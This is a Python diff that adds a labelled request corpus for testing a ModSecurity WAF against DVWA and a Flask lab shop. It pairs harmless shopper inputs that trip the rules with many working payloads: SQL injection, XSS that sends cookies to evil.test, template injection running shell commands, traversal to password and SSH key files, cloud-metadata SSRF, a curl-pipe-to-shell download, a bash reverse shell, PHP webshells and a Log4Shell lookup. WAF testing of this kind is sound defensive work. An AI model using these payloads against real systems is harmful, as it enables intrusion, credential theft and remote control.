@@ -592,3 +592,477 @@ def to_ftw_tests(cases: list[CorpusCase] | None = None) -> dict[str, Any]:
         },
         "tests": tests,
     }
+
+
+# ---------------------------------------------------------------------------
+# Request-level corpus (eval/requests.jsonl)
+#
+# Each RequestCase is one complete, believable request to one of the two lab
+# apps behind the same ModSecurity: DVWA (PHP/MySQL, any Host) and the Flask
+# Lab Shop (Python/SQLite, Host shop.lab). The payload goes into exactly one
+# input (query/form/JSON field, header, cookie or the path); every other field
+# of the form carries an ordinary value. eval/capture_lab.py --requests replays
+# these through the real WAF and labels the matches that hit the payload.
+# ---------------------------------------------------------------------------
+
+APP_HOSTS = {"dvwa": "localhost", "flask": "shop.lab"}
+
+# Ordinary values for every field of each form, so a request looks like a real
+# submission. They are chosen so they do not trip CRS on their own.
+ROUTE_FORMS: dict[str, dict[str, tuple[str, str, dict[str, Any]]]] = {
+    "dvwa": {
+        "sqli": ("GET", "/vulnerabilities/sqli/", {"id": "1", "Submit": "Submit"}),
+        "sqli_blind": ("GET", "/vulnerabilities/sqli_blind/", {"id": "1", "Submit": "Submit"}),
+        "xss_r": ("GET", "/vulnerabilities/xss_r/", {"name": "Ana"}),
+        "xss_d": ("GET", "/vulnerabilities/xss_d/", {"default": "English"}),
+        "xss_s": ("POST", "/vulnerabilities/xss_s/", {"txtName": "Ana", "mtxMessage": "Great lab, thanks.", "btnSign": "Sign Guestbook"}),
+        "exec": ("POST", "/vulnerabilities/exec/", {"ip": "127.0.0.1", "Submit": "Submit"}),
+        "fi": ("GET", "/vulnerabilities/fi/", {"page": "include.php"}),
+        "brute": ("GET", "/vulnerabilities/brute/", {"username": "admin", "password": "password", "Login": "Login"}),
+        "csrf": ("GET", "/vulnerabilities/csrf/", {"password_new": "password", "password_conf": "password", "Change": "Change"}),
+        "login": ("POST", "/login.php", {"username": "admin", "password": "password", "Login": "Login",
+                                         "user_token": "5f4dcc3b5aa765d61d8327deb882cf99"}),
+        "security": ("POST", "/security.php", {"security": "low", "seclev_submit": "Submit",
+                                               "user_token": "5f4dcc3b5aa765d61d8327deb882cf99"}),
+        "instructions": ("GET", "/instructions.php", {"doc": "readme"}),
+        "home": ("GET", "/index.php", {}),
+    },
+    "flask": {
+        "home": ("GET", "/", {}),
+        "search": ("GET", "/search", {"q": "tote", "category": "", "sort": "relevance"}),
+        "product": ("GET", "/products/2", {}),
+        "reviews": ("POST", "/reviews", {"product_id": "2", "author": "Sam", "rating": "5", "body": "Great hoodie."}),
+        "cart": ("POST", "/api/cart", {"sku": "SKU-1002", "quantity": 1, "coupon": "", "gift_message": ""}),
+        "download": ("GET", "/download", {"name": "user-guide.pdf"}),
+        "preview": ("POST", "/preview", {"url": "https://shop.lab/products/2"}),
+        "settings": ("POST", "/account/settings", {"display_name": "Sam", "email": "sam@example.com", "bio": "Hi.",
+                                                    "website": "", "timezone": "Europe/London", "signature": "Sam"}),
+        "login": ("POST", "/login", {"username": "shopper", "password": "correct horse battery staple", "next": "/"}),
+        "support": ("POST", "/support", {"subject": "Order question", "message": "Where is my order?",
+                                         "order_id": "ORD-2024-0042"}),
+    },
+}
+
+
+@dataclass(frozen=True)
+class RequestCase:
+    id: str
+    app: str  # "dvwa" | "flask"
+    label: str  # "attack" | "false_positive"
+    category: str
+    method: str
+    path: str
+    target: str  # "query" | "form" | "json" | "header" | "cookie" | "path"
+    parameter: str | None
+    payload: str
+    fields: dict[str, Any] = field(default_factory=dict)
+    headers: dict[str, str] = field(default_factory=dict)
+    cookies: dict[str, str] = field(default_factory=dict)
+    wrong_stack: bool = False
+    notes: str = ""
+
+    @property
+    def host(self) -> str:
+        return APP_HOSTS[self.app]
+
+    @property
+    def payload_target(self) -> dict[str, str | None]:
+        """Where ModSecurity sees the payload, in its own collection names."""
+        if self.target in {"query", "form"}:
+            return {"collection": "ARGS", "parameter": self.parameter}
+        if self.target == "json":
+            return {"collection": "ARGS", "parameter": f"json.{self.parameter}"}
+        if self.target == "header":
+            return {"collection": "REQUEST_HEADERS", "parameter": self.parameter}
+        if self.target == "cookie":
+            return {"collection": "REQUEST_COOKIES", "parameter": self.parameter}
+        return {"collection": "REQUEST_FILENAME", "parameter": None}
+
+
+def _r(
+    app: str,
+    label: str,
+    category: str,
+    slug: str,
+    route: str,
+    target: str,
+    parameter: str | None,
+    payload: str,
+    *,
+    wrong_stack: bool = False,
+    notes: str = "",
+) -> RequestCase:
+    method, path, defaults = ROUTE_FORMS[app][route]
+    fields = dict(defaults)
+    headers: dict[str, str] = {}
+    cookies: dict[str, str] = {}
+    if target in {"query", "form", "json"}:
+        fields[parameter] = payload
+    elif target == "header":
+        headers[parameter] = payload
+    elif target == "cookie":
+        cookies[parameter] = payload
+    elif target == "path":
+        method, path, fields = "GET", payload, {}
+    kind = "attack" if label == "attack" else "fp"
+    return RequestCase(
+        id=f"{app}-{kind}-{category}-{slug}",
+        app=app,
+        label=label,
+        category=category,
+        method=method,
+        path=path,
+        target=target,
+        parameter=parameter,
+        payload=payload,
+        fields=fields,
+        headers=headers,
+        cookies=cookies,
+        wrong_stack=wrong_stack,
+        notes=notes,
+    )
+
+
+def _rows(app: str, label: str, rows, *, wrong_stack: bool = False) -> list[RequestCase]:
+    cases = []
+    for row in rows:
+        category, slug, route, target, parameter, payload, *rest = row
+        cases.append(_r(app, label, category, slug, route, target, parameter, payload,
+                        wrong_stack=wrong_stack, notes=rest[0] if rest else ""))
+    return cases
+
+
+A, FP = "attack", "false_positive"
+
+# Harmless input that real shoppers type and that trips CRS anyway.
+FLASK_HARMLESS = [
+    ("sqli", "search-union-select-hoodie", "search", "query", "q", "union select hoodie"),
+    ("sqli", "search-union-made-select", "search", "query", "q", "union made select denim jacket"),
+    ("sqli", "search-quoted-or", "search", "query", "q", "hoodie' or 'tote"),
+    ("sqli", "search-levis-or", "search", "query", "q", "Levi's 501 or 505 jeans"),
+    ("sqli", "search-minus-operators", "search", "query", "q", "tote bag -leather --sale"),
+    ("sqli", "search-rock-n-roll", "search", "query", "q", "rock 'n' roll tee"),
+    ("sqli", "search-inch-mark", "search", "query", "q", "50\" tv stand"),
+    ("sqli", "search-drop-leaf-table", "search", "query", "q", "drop table lamp"),
+    ("sqli", "search-select-and-save", "search", "query", "q", "select & save coupon"),
+    ("sqli", "search-kids-table", "search", "query", "q", "kids' table & chairs (set of 4)"),
+    ("sqli", "search-worlds-best", "search", "query", "q", "mug \"world's best dad\""),
+    ("sqli", "search-sql-mug", "search", "query", "q", "SELECT * FROM coffee mug"),
+    ("sqli", "search-order-by-price", "search", "query", "q", "order by price; under $20"),
+    ("rce", "search-time-turner", "search", "query", "q", "time turner necklace"),
+    ("rce", "search-ping-pong", "search", "query", "q", "ping pong paddles"),
+    ("rce", "search-cat-tree", "search", "query", "q", "cat tree with scratching post"),
+    ("rce", "search-sudo-sandwich", "search", "query", "q", "sudo make me a sandwich shirt"),
+    ("rce", "search-rm-rf-mug", "search", "query", "q", "rm -rf / coffee mug"),
+    ("lfi", "search-bashrc-tee", "search", "query", "q", "~/.bashrc t-shirt"),
+    ("lfi", "search-etc-passwd-sticker", "search", "query", "q", "/etc/passwd sticker"),
+    ("xss", "search-heart", "search", "query", "q", "<3 valentine mug"),
+    ("sqli", "review-quoted-words", "reviews", "form", "body", "I'd call it 'select' quality, or 'premium' at least."),
+    ("sqli", "review-sql-mug-quote", "reviews", "form", "body", "The print says `SELECT * FROM coffee;` and my DBA coworkers love it."),
+    ("sqli", "review-dash-signoff", "reviews", "form", "body", "Fits like a glove ;) 10/10 -- would recommend"),
+    ("sqli", "review-ratio", "reviews", "form", "body", "Shipping took 3 days; quality is 5/5 & price = fair."),
+    ("sqli", "review-backticks", "reviews", "form", "body", "Wore it to the `npm install` meetup, got lots of compliments."),
+    ("xss", "review-bold-italic", "reviews", "form", "body", "<b>Great</b> tote, <i>very</i> roomy."),
+    ("xss", "review-markdown-list", "reviews", "form", "body", "Five stars!\n\n* sturdy\n* roomy\n\n**Would buy again**"),
+    ("xss", "review-blockquote", "reviews", "form", "body", "<blockquote>Best hoodie ever</blockquote> -- my wife"),
+    ("xss", "review-link", "reviews", "form", "body", "<a href=\"https://photos.example.com/u/sam/tote.jpg\">photo of the bag</a>"),
+    ("xss", "review-paragraphs", "reviews", "form", "body", "<p>Zip broke after a week.</p><p>Support replaced it &mdash; great service.</p>"),
+    ("xss", "review-ul", "reviews", "form", "body", "<ul><li>roomy</li><li>sturdy</li></ul>"),
+    ("xss", "review-pre-sizes", "reviews", "form", "body", "<pre>size: L\nchest: 104cm</pre>"),
+    ("xss", "review-code-tag", "reviews", "form", "body", "The tag says <code>wash cold</code>, <strong>do not</strong> tumble dry."),
+    ("rce", "review-python-codeblock", "reviews", "form", "body", "```python\nfor item in cart:\n    print(item)\n```\nworks as a sticker too"),
+    ("rce", "review-shell-joke", "reviews", "form", "body", "My kid says the mug is `sudo rm -rf /` funny. Ok then."),
+    ("sqli", "review-author-obrien", "reviews", "form", "author", "Siobhán O'Brien"),
+    ("sqli", "review-author-dsouza", "reviews", "form", "author", "Ana-María D'Souza"),
+    ("rfi", "settings-website-github", "settings", "form", "website", "https://github.com/sam-dev"),
+    ("rfi", "settings-website-blog", "settings", "form", "website", "https://sam.example.org/blog/"),
+    ("sqli", "settings-bio-sql", "settings", "form", "bio", "Backend dev. I write SQL like `SELECT name FROM users WHERE id = ?` all day."),
+    ("sqli", "settings-signature-dashes", "settings", "form", "signature", "-- \nSam | sam@example.com | 'ship it'"),
+    ("sqli", "settings-signature-comment", "settings", "form", "signature", "/* TODO: write a better signature */"),
+    ("xss", "settings-signature-loop", "settings", "form", "signature", "while (true) { coffee(); code(); }"),
+    ("rce", "settings-signature-sudo", "settings", "form", "signature", "sudo !! -- the story of my life"),
+    ("lfi", "settings-signature-windows", "settings", "form", "signature", "C:\\Users\\sam> echo hello"),
+    ("sqli", "settings-display-name-dangelo", "settings", "form", "display_name", "D'Angelo"),
+    ("sqli", "settings-email-oconnor", "settings", "form", "email", "o'connor@example.ie"),
+    ("xss", "settings-bio-markdown", "settings", "form", "bio", "**Coffee** & _code_. Find me at <https://sam.example.org>"),
+    ("xss", "support-handlebars", "support", "form", "message", "My order page shows {{ order.total }} instead of the amount."),
+    ("rce", "support-dollar-brace", "support", "form", "message", "The receipt says ${total} instead of the price."),
+    ("rce", "support-curl", "support", "form", "message", "I tried curl -X POST https://shop.lab/api/cart and got a 400."),
+    ("lfi", "support-relative-path", "support", "form", "message", "Download fails: ../downloads/user-guide.pdf not found"),
+    ("sqli", "support-sqlstate", "support", "form", "message", "Error: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '42' for key 'PRIMARY'"),
+    ("rce", "support-cat-pipe", "support", "form", "message", "Running `cat ~/Downloads/invoice.pdf | lpr` prints garbage."),
+    ("lfi", "support-windows-hosts", "support", "form", "message", "Our proxy edits C:\\Windows\\System32\\drivers\\etc\\hosts and now your site will not load."),
+    ("xss", "support-js-error", "support", "form", "message", "Console says: Uncaught TypeError: Cannot read properties of undefined (reading 'map') at <anonymous>:1:1"),
+    ("sqli", "support-refund-dashes", "support", "form", "message", "Order ORD-2024-0042; I paid twice -- please refund one."),
+    ("rce", "support-python-traceback", "support", "form", "message", "Traceback (most recent call last):\n  File \"/usr/lib/python3/site-packages/shopcli.py\", line 12, in <module>\n    import os"),
+    ("sqli", "support-select-quote", "support", "form", "message", "Your status page said 'select * from orders where id=42' returned nothing."),
+    ("xss", "support-console-log", "support", "form", "message", "Pasting console.log(window.cart) shows an empty list."),
+    ("sqli", "support-subject-hash", "support", "form", "subject", "Refund for order #42 -- double charge"),
+    ("lfi", "download-nginx-sample", "download", "query", "name", "nginx.conf.sample"),
+    ("lfi", "download-settings-ini", "download", "query", "name", "settings.ini.example"),
+    ("lfi", "download-passwd-guide", "download", "query", "name", "passwd-reset-guide.pdf"),
+    ("lfi", "download-htaccess-guide", "download", "query", "name", "htaccess-guide.v2.pdf"),
+    ("lfi", "download-backup-tar", "download", "query", "name", "backup.2024-03.tar.gz"),
+    ("lfi", "download-web-config", "download", "query", "name", "web.config.example.txt"),
+    ("rfi", "preview-github", "preview", "form", "url", "https://github.com/pallets/flask"),
+    ("rfi", "preview-youtube", "preview", "form", "url", "https://www.youtube.com/watch?v=dQw4w9WgXcQ"),
+    ("rfi", "preview-blog-sql-words", "preview", "form", "url", "https://blog.example.com/select-the-best-union-made-boots"),
+    ("rfi", "preview-python-docs", "preview", "form", "url", "https://docs.python.org/3/library/os.html#os.system"),
+    ("rfi", "preview-php-manual", "preview", "form", "url", "https://www.php.net/manual/en/function.include.php"),
+    ("sqli", "login-password-quote-dashes", "login", "form", "password", "p@ss'w0rd--2024"),
+    ("sqli", "login-password-symbols", "login", "form", "password", "Tr0ub4dor&3' or so"),
+    ("sqli", "login-username-oneil", "login", "form", "username", "o'neil"),
+    ("protocol", "login-next-query", "login", "form", "next", "/account/settings?tab=profile&from=/search?q=tote"),
+    ("sqli", "cart-gift-love", "cart", "json", "gift_message", "Happy birthday! <3 -- Mum & Dad"),
+    ("sqli", "cart-gift-select-few", "cart", "json", "gift_message", "For the 'select' few ;)"),
+    ("xss", "cart-gift-braces", "cart", "json", "gift_message", "Merry Xmas :) {love, Sam}"),
+    ("sqli", "cart-coupon-percent", "cart", "json", "coupon", "SAVE-20%-OFF"),
+    ("sqli", "referer-search-engine", "home", "header", "Referer", "https://www.google.com/search?q=union+select+hoodie+lab+shop"),
+    ("sqli", "referer-forum-quote", "search", "header", "Referer", "https://forum.example.com/t/is-the-'select'-notebook-worth-it/123"),
+    ("sqli", "ua-in-app-browser", "home", "header", "User-Agent", "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/470.0.0.40.110;]"),
+    ("sqli", "cookie-prefs-json", "product", "cookie", "prefs", "{\"theme\":\"dark\",\"recent\":[\"tote\",\"hoodie\"]}"),
+    ("sqli", "cookie-recent-searches", "search", "cookie", "recent", "union select hoodie|drop table lamp"),
+    ("sqli", "cookie-cart-note", "home", "cookie", "cart_note", "gift wrap -- 'blue' paper"),
+]
+
+FLASK_ATTACKS = [
+    ("sqli", "search-union-sqlite-master", "search", "query", "q", "' UNION SELECT sql,2,3 FROM sqlite_master--"),
+    ("sqli", "search-and-true", "search", "query", "q", "tote' AND 1=1--"),
+    ("sqli", "search-order-by-probe", "search", "query", "q", "tote' ORDER BY 5--"),
+    ("sqli", "search-or-limit", "search", "query", "q", "' OR 1=1 LIMIT 1--"),
+    ("sqli", "search-concat-subquery", "search", "query", "q", "tote'||(SELECT name FROM sqlite_master LIMIT 1)||'"),
+    ("sqli", "search-category-or", "search", "query", "category", "bags' OR '1'='1"),
+    ("sqli", "search-sort-stacked", "search", "query", "sort", "price;DROP TABLE products--"),
+    ("sqli", "search-page-sleep", "search", "query", "page", "1 AND (SELECT 1 FROM (SELECT SLEEP(5))x)"),
+    ("sqli", "search-randomblob", "search", "query", "q", "1' AND 1=randomblob(500000000)--"),
+    ("xss", "search-script-cookie", "search", "query", "q", "<script>alert(document.cookie)</script>"),
+    ("xss", "search-svg-onload", "search", "query", "q", "\"><svg/onload=alert(1)>"),
+    ("ssti", "search-jinja-probe", "search", "query", "q", "{{7*7}}"),
+    ("ssti", "search-jinja-config", "search", "query", "q", "{{config.items()}}"),
+    ("ssti", "search-jinja-subclasses", "search", "query", "q", "{{ ''.__class__.__mro__[1].__subclasses__() }}"),
+    ("ssti", "search-jinja-popen", "search", "query", "q", "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"),
+    ("xss", "review-script-exfil", "reviews", "form", "body", "<script>fetch('//evil.test/?c='+document.cookie)</script>"),
+    ("xss", "review-img-onerror", "reviews", "form", "body", "Love it <img src=x onerror=alert(1)>"),
+    ("xss", "review-markdown-js-link", "reviews", "form", "body", "[see photos](javascript:alert(document.domain))"),
+    ("xss", "review-anchor-js", "reviews", "form", "body", "<a href=\"javascript:alert(1)\">deal</a>"),
+    ("xss", "review-iframe", "reviews", "form", "body", "<iframe src=//evil.test/x></iframe>"),
+    ("xss", "review-svg-animate", "reviews", "form", "body", "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"),
+    ("xss", "review-author-script", "reviews", "form", "author", "<script>alert(1)</script>"),
+    ("sqli", "review-rating-or", "reviews", "form", "rating", "5' OR '1'='1"),
+    ("sqli", "review-product-union", "reviews", "form", "product_id", "2 UNION SELECT username,password,3,4 FROM users"),
+    ("ssti", "review-body-jinja", "reviews", "form", "body", "{{ cycler.__init__.__globals__.os.popen('id').read() }}"),
+    ("xss", "cart-gift-img", "cart", "json", "gift_message", "<img src=x onerror=alert(1)>"),
+    ("sqli", "cart-coupon-or", "cart", "json", "coupon", "' OR 1=1--"),
+    ("sqli", "cart-sku-stacked", "cart", "json", "sku", "1; DROP TABLE carts--"),
+    ("sqli", "cart-sku-union", "cart", "json", "sku", "1 UNION SELECT password FROM users"),
+    ("ssti", "cart-gift-jinja", "cart", "json", "gift_message", "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"),
+    ("lfi", "download-traversal", "download", "query", "name", "../../../../etc/passwd"),
+    ("lfi", "download-app-source", "download", "query", "name", "../app.py"),
+    ("lfi", "download-proc-environ", "download", "query", "name", "/proc/self/environ"),
+    ("lfi", "download-dotdot-filter-bypass", "download", "query", "name", "....//....//....//etc/passwd"),
+    ("lfi", "download-ssh-key", "download", "query", "name", "../../../../root/.ssh/id_rsa"),
+    ("lfi", "download-encoded-traversal", "download", "query", "name", "..%2f..%2f..%2fetc%2fshadow"),
+    ("ssrf", "preview-metadata", "preview", "form", "url", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
+    ("ssrf", "preview-localhost-admin", "preview", "form", "url", "http://127.0.0.1:5000/admin"),
+    ("ssrf", "preview-file-scheme", "preview", "form", "url", "file:///etc/passwd"),
+    ("ssrf", "preview-gopher-redis", "preview", "form", "url", "gopher://127.0.0.1:6379/_FLUSHALL"),
+    ("ssrf", "preview-hex-ip", "preview", "form", "url", "http://0x7f000001/server-status"),
+    ("ssrf", "preview-gcp-metadata", "preview", "form", "url", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
+    ("xss", "settings-website-js", "settings", "form", "website", "javascript:alert(document.cookie)"),
+    ("xss", "settings-bio-script-src", "settings", "form", "bio", "<script src=https://evil.test/x.js></script>"),
+    ("ssti", "settings-display-name-jinja", "settings", "form", "display_name", "{{ cycler.__init__.__globals__.os.popen('id').read() }}"),
+    ("xss", "settings-signature-img", "settings", "form", "signature", "<img src=x onerror=prompt(1)>"),
+    ("sqli", "settings-email-or", "settings", "form", "email", "x@example.com' OR '1'='1"),
+    ("lfi", "settings-timezone-traversal", "settings", "form", "timezone", "../../../../etc/passwd"),
+    ("sqli", "login-username-comment", "login", "form", "username", "admin' --"),
+    ("sqli", "login-username-or", "login", "form", "username", "admin' OR '1'='1"),
+    ("sqli", "login-password-empty-or", "login", "form", "password", "' OR ''='"),
+    ("xss", "login-next-javascript", "login", "form", "next", "javascript:alert(document.domain)"),
+    ("rce", "support-cat-passwd", "support", "form", "message", "test; cat /etc/passwd"),
+    ("rce", "support-curl-sh", "support", "form", "message", "$(curl -s http://evil.test/x.sh | sh)"),
+    ("rce", "support-python-import-os", "support", "form", "message", "__import__('os').system('id')"),
+    ("rce", "support-python-eval", "support", "form", "message", "eval(compile('import os;os.system(\"id\")','x','exec'))"),
+    ("sqli", "support-order-id-union", "support", "form", "order_id", "ORD-1' UNION SELECT NULL,sql FROM sqlite_master--"),
+    ("rce", "support-reverse-shell", "support", "form", "message", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
+    ("scanner", "ua-sqlmap", "search", "header", "User-Agent", "sqlmap/1.8#stable (https://sqlmap.org)"),
+    ("rce", "ua-shellshock", "home", "header", "User-Agent", "() { :; }; /bin/bash -c 'cat /etc/passwd'"),
+    ("sqli", "ua-sleep", "home", "header", "User-Agent", "Mozilla/5.0' AND SLEEP(5)-- "),
+    ("xss", "referer-script", "search", "header", "Referer", "https://evil.test/?q=<script>alert(1)</script>"),
+    ("sqli", "referer-union", "product", "header", "Referer", "https://shop.lab/search?q=' UNION SELECT password FROM users--"),
+    ("sqli", "xff-or", "home", "header", "X-Forwarded-For", "127.0.0.1' OR 1=1--",
+     "CRS does not inspect X-Forwarded-For by default; expected to be dropped (no labeled match)"),
+    ("sqli", "cookie-cart-id-or", "home", "cookie", "cart_id", "1' OR '1'='1"),
+    ("sqli", "cookie-currency-union", "product", "cookie", "currency", "USD' UNION SELECT password FROM users--"),
+    ("xss", "cookie-recent-script", "search", "cookie", "recent", "<script>alert(1)</script>"),
+    ("lfi", "cookie-currency-traversal", "product", "cookie", "currency", "../../../../etc/passwd"),
+    ("ssti", "cookie-cart-jinja", "home", "cookie", "cart_id", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
+    ("lfi", "path-dotenv", "home", "path", None, "/.env"),
+    ("lfi", "path-git-config", "home", "path", None, "/.git/config"),
+    ("sqli", "path-product-union", "home", "path", None, "/products/1%20UNION%20SELECT%20password%20FROM%20users"),
+]
+
+# PHP and Java payloads sent to the Python app: still attacks, just not for this stack.
+FLASK_WRONG_STACK = [
+    ("php", "download-php-filter", "download", "query", "name", "php://filter/convert.base64-encode/resource=index.php"),
+    ("php", "download-expect", "download", "query", "name", "expect://id"),
+    ("php", "download-phar", "download", "query", "name", "phar:///tmp/upload.jpg/shell.php"),
+    ("php", "review-php-system", "reviews", "form", "body", "<?php system($_GET['c']); ?>"),
+    ("php", "support-shell-exec", "support", "form", "message", "<?php echo shell_exec($_GET['cmd']); ?>"),
+    ("php", "search-short-tag-backtick", "search", "query", "q", "<?=`$_GET[c]`?>"),
+    ("php", "cart-serialized-object", "cart", "json", "gift_message", "O:8:\"stdClass\":1:{s:4:\"file\";s:11:\"/etc/passwd\";}"),
+    ("php", "preview-data-wrapper", "preview", "form", "url", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=="),
+    ("php", "settings-bio-eval-b64", "settings", "form", "bio", "eval(base64_decode($_POST['x']));"),
+    ("php", "search-assert", "search", "query", "q", "assert($_REQUEST['c'])"),
+    ("php", "ua-log-poison", "home", "header", "User-Agent", "<?php system('id'); ?>"),
+    ("php", "cookie-lang-php-filter", "home", "cookie", "lang", "php://filter/convert.base64-encode/resource=index.php"),
+    ("php", "path-wp-login", "home", "path", None, "/wp-login.php"),
+    ("php", "path-phpinfo", "home", "path", None, "/phpinfo.php"),
+    ("php", "path-thinkphp-rce", "home", "path", None,
+     "/index.php?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=id"),
+    ("java", "ua-log4shell", "home", "header", "User-Agent", "${jndi:ldap://evil.test:1389/a}"),
+    ("java", "cart-runtime-exec", "cart", "json", "gift_message", "java.lang.Runtime.getRuntime().exec(\"id\")"),
+]
+
+DVWA_HARMLESS = [
+    ("sqli", "guestbook-union-select-prose", "xss_s", "form", "mtxMessage", "Learned how UNION SELECT works today, thanks!"),
+    ("sqli", "guestbook-quoted-words", "xss_s", "form", "mtxMessage", "I'd love a 'dark mode' or 'night' theme."),
+    ("sqli", "guestbook-dash-signoff", "xss_s", "form", "mtxMessage", "Great guestbook :-) -- Ana"),
+    ("sqli", "guestbook-select-colour", "xss_s", "form", "mtxMessage", "Select your favourite colour from the list below; mine is blue."),
+    ("xss", "guestbook-bold", "xss_s", "form", "mtxMessage", "<b>Nice lab!</b> See you next week."),
+    ("xss", "guestbook-em-strong", "xss_s", "form", "mtxMessage", "This is <em>really</em> <strong>useful</strong>."),
+    ("xss", "guestbook-script-word", "xss_s", "form", "mtxMessage", "The script tag lesson was the best part of the course."),
+    ("rce", "guestbook-shell-prose", "xss_s", "form", "mtxMessage", "Tip: run ls -la; then cat the readme."),
+    ("sqli", "guestbook-name-oreilly", "xss_s", "form", "txtName", "O'Reilly"),
+    ("sqli", "guestbook-name-dangelo", "xss_s", "form", "txtName", "D'Angelo"),
+    ("sqli", "xss-r-name-apostrophe", "xss_r", "query", "name", "Ana-María O'Connor"),
+    ("sqli", "xss-r-name-ampersand", "xss_r", "query", "name", "Smith & Jones"),
+    ("sqli", "xss-r-name-or", "xss_r", "query", "name", "Sam 'or' Samantha"),
+    ("sqli", "login-password-quote-dashes", "login", "form", "password", "p@ss'w0rd--2024"),
+    ("sqli", "login-username-obrien", "login", "form", "username", "o'brien"),
+    ("sqli", "brute-password-symbols", "brute", "query", "password", "Tr0ub4dor&3' or so"),
+    ("sqli", "brute-password-hash", "brute", "query", "password", "#hunter2--!"),
+    ("sqli", "csrf-password-quote", "csrf", "query", "password_new", "it's-a-secret--2024"),
+    ("sqli", "csrf-password-conf-quote", "csrf", "query", "password_conf", "it's-a-secret--2024"),
+    ("sqli", "sqli-id-name-lookup", "sqli", "query", "id", "O'Neil"),
+    ("lfi", "fi-page-dotted", "fi", "query", "page", "file1.php"),
+    ("lfi", "instructions-doc", "instructions", "query", "doc", "PDF"),
+    ("sqli", "referer-search-engine", "sqli", "header", "Referer", "https://www.google.com/search?q=dvwa+union+select+tutorial"),
+    ("sqli", "cookie-prefs-json", "home", "cookie", "prefs", "{\"theme\":\"dark\",\"tabs\":[\"sqli\",\"xss\"]}"),
+    ("sqli", "cookie-prefs-last-lab", "home", "cookie", "prefs", "{\"lastLab\":\"/vulnerabilities/sqli/?id=1&Submit=Submit\"}"),
+    ("sqli", "cookie-prefs-note", "home", "cookie", "prefs", "{\"note\":\"union select practice tomorrow\"}"),
+    ("sqli", "cookie-theme-dashes", "home", "cookie", "theme", "dark -- high contrast"),
+    ("sqli", "cookie-theme-quoted-or", "home", "cookie", "theme", "\"solarized\" or \"dark\""),
+    ("sqli", "guestbook-sql-module", "xss_s", "form", "mtxMessage", "Loved the SQL module -- especially the part about SELECT and UNION."),
+    ("sqli", "guestbook-admin-or-root", "xss_s", "form", "mtxMessage", "Is 'admin' or 'root' the default user?"),
+    ("sqli", "guestbook-signed-email", "xss_s", "form", "mtxMessage", "Signed, Ana (ana@example.com) -- see you Monday!"),
+    ("rfi", "guestbook-notes-link", "xss_s", "form", "mtxMessage", "Check my notes at https://notes.example.org/dvwa"),
+    ("xss", "guestbook-paragraph-bold", "xss_s", "form", "mtxMessage", "<p>Hello from the <b>Tuesday</b> class!</p>"),
+    ("xss", "guestbook-template-placeholder", "xss_s", "form", "mtxMessage", "Use {{ name }} placeholders in the template exercise."),
+    ("rce", "guestbook-shell-prompt", "xss_s", "form", "mtxMessage", "My shell prompt is $HOME/bin; very cool"),
+    ("sqli", "guestbook-one-equals-one", "xss_s", "form", "mtxMessage", "Who else thinks 1=1 is the funniest equation? :)"),
+    ("sqli", "guestbook-ten-out-of-ten", "xss_s", "form", "mtxMessage", "Wow; just wow. 10/10 -- would hack again"),
+    ("xss", "guestbook-script-lesson", "xss_s", "form", "mtxMessage", "Learned about <script> tags and why to escape them."),
+    ("lfi", "guestbook-windows-path", "xss_s", "form", "mtxMessage", "C:\\Users\\ana\\Desktop\\notes.txt has my writeup"),
+    ("sqli", "guestbook-order-by-homework", "xss_s", "form", "mtxMessage", "Remember: ORDER BY 1 is not an attack, it's homework!"),
+    ("sqli", "guestbook-name-ta", "xss_s", "form", "txtName", "Ana -- TA"),
+    ("xss", "guestbook-name-italic", "xss_s", "form", "txtName", "<i>Ana</i>"),
+    ("sqli", "xss-r-name-class", "xss_r", "query", "name", "Ana -- from the Tuesday class"),
+    ("xss", "xss-r-name-bold", "xss_r", "query", "name", "<b>Ana</b>"),
+    ("sqli", "xss-r-name-email", "xss_r", "query", "name", "Ana (ana@example.com) -- hi!"),
+    ("rfi", "xss-r-name-homepage", "xss_r", "query", "name", "https://ana.example.org"),
+    ("xss", "xss-r-name-braces", "xss_r", "query", "name", "{{ana}}"),
+    ("sqli", "xss-r-name-laptop", "xss_r", "query", "name", "Sam's laptop (192.168.1.20) -- lab seat 4"),
+    ("sqli", "exec-host-comment", "exec", "form", "ip", "example.com -- the course server"),
+    ("rfi", "exec-host-url", "exec", "form", "ip", "https://example.com"),
+    ("sqli", "exec-host-or", "exec", "form", "ip", "192.168.0.1 or 192.168.0.254"),
+    ("sqli", "xss-d-language-region", "xss_d", "query", "default", "English -- UK"),
+    ("sqli", "referer-bing", "sqli", "header", "Referer", "https://www.bing.com/search?q=dvwa+sql+injection+union+select+tutorial"),
+    ("sqli", "referer-forum-or", "sqli", "header", "Referer", "https://forum.example.com/t/why-does-'or-1=1'-work/77"),
+    ("sqli", "referer-course-topic", "sqli", "header", "Referer", "https://course.example.edu/week3/labs?topic=select%20from%20where"),
+    ("xss", "referer-script-question", "xss_r", "header", "Referer", "https://www.google.com/search?q=what+is+%3Cscript%3E+tag"),
+]
+
+DVWA_ATTACKS = [
+    ("sqli", "sqli-or-true", "sqli", "query", "id", "1' OR '1'='1"),
+    ("sqli", "sqli-union-users", "sqli", "query", "id", "1' UNION SELECT user,password FROM users#"),
+    ("sqli", "sqli-union-version", "sqli", "query", "id", "1' UNION SELECT @@version,database()#"),
+    ("sqli", "sqli-information-schema", "sqli", "query", "id", "1' UNION SELECT table_name,2 FROM information_schema.tables#"),
+    ("sqli", "sqli-order-by", "sqli", "query", "id", "1' ORDER BY 3#"),
+    ("sqli", "sqli-load-file", "sqli", "query", "id", "1' UNION SELECT load_file('/etc/passwd'),2#"),
+    ("sqli", "sqli-into-outfile", "sqli", "query", "id", "1' UNION SELECT '<?php system($_GET[c]); ?>',2 INTO OUTFILE '/var/www/html/s.php'#"),
